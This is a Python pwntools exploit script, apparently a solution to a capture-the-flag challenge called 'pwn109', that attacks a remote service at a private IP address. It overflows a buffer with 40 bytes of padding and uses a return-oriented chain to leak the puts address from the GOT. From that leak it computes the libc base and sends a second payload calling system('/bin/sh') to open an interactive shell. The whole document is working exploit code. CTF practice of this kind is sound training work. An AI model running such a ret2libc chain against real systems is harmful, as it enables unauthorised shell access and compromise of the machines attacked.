#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./pwn109.pwn109', checksec=False)

#context.log_level = 'DEBUG'

libc = ELF('libc6_2.27-3ubuntu1.4_amd64.so') # Can be found at libc.rip

io = remote('10.10.225.199', 9009)
#io = process()

# Offset found using cyclic pattern in gdb
padding = b"A" * 40
ret_gadget = 0x40101a
pop_rdi = 0x4012a3

# Payload to leak puts and gets addresses
payload = padding
payload += p64(pop_rdi)
payload += p64(elf.got.puts)  # Address of puts GOT entry
payload += p64(elf.plt.puts)
#payload += p64(pop_rdi)     
#payload += p64(elf.got.gets)  #Address of gets entry
#payload += p64(elf.plt.puts)
payload += p64(elf.symbols.main)  # Return to main

io.recvuntil("Go ahead")
io.recvline()

io.sendline(payload)

# Receive and parse the leaked address of puts
got_puts_leak = u64(io.recvline().strip().ljust(8, b'\0'))
info("puts leaked address: %#x", got_puts_leak)

# Receive and parse the leaked address of gets
#gets_puts_leak = u64(io.recvline().strip().ljust(8, b'\0'))
#info("gets leaked address: %#x", gets_puts_leak)

# Calculate the libc base address using the puts leak
libc.address = got_puts_leak - libc.symbols.puts
info("libc base address: %#x", libc.address)

# Calculate system and "/bin/sh" addresses
system = libc.symbols.system
bin_sh = next(libc.search(b"/bin/sh"))

info("system address: %#x", system)
info("/bin/sh address: %#x", bin_sh)

# Final payload to execute system("/bin/sh")
payload2 = padding
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(ret_gadget)
payload2 += p64(system)

io.recvuntil("Go ahead")
io.sendline(payload2)
io.interactive()
